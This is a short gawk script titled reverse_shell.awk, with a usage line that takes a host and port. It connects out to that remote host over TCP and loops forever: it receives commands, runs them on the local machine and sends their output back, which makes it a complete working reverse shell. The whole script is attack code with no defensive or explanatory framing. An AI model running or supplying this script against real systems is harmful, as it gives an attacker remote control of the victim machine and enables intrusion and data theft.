#!/usr/bin/env -S awk -f
# Usage: ./reverse_shell.awk <host>:<port>

BEGIN {
    sub(":", "/", ARGV[1])
    c = "/inet/tcp/0/" ARGV[1]

    while (1) {
        c |& getline cmd
        if(cmd ~ /^exit/) close(c)
        while (cmd |& getline result) {
            print result |& c
        }
        close(cmd)
    }
}
